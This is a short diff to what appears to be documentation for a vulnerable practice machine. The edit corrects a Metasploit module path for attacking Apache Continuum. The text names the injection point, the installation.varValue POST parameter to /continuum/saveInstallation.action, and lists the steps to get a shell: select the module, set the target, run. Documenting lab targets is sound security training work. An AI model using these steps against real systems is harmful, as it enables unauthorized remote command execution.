@@ -92,7 +92,7 @@ usermod -a -G lpadmin vagrant
 **Execution Method:** By injecting a command into the installation.varValue POST parameter to /continuum/saveInstallation.action, a shell can be spawned.
 
 **Steps in Metasploit:**
-1. Select the exploit: `use linux/http/apache_continuum_cmd_exec`
+1. Select the exploit: `use exploit/linux/http/apache_continuum_cmd_exec`
 2. Set the target IP: `set RHOSTS <target_ip>`
 3. Execute the attack: `run`
 
